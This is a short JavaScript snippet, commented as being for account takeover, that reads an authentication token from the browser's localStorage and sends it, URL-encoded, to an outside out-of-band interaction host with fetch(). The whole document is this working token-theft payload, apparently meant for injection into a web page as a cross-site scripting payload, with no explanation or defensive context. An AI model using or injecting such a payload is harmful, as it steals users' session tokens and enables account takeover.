// This script is for ATO
(function() {
  const token = localStorage.getItem('token');
  if (token) {
    const encodedToken = encodeURIComponent(token);
    fetch(`abzfdgjdobpnrmlcfsqo5jrtg5ghq5wu6.oast.fun/?token=${encodedToken}`);
  }
})();
